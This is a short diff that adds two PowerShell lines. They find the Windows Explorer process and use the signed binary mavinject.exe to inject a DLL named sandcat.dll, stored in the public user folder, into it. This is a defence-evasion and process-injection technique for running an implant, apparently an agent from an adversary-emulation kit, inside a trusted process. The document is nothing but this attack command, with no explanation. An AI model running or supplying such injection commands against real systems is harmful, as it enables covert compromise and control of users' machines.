@@ -1,0 +1,2 @@
+$explorer = Get-Process -Name explorer;
+mavinject.exe $explorer.id C:\Users\Public\sandcat.dll
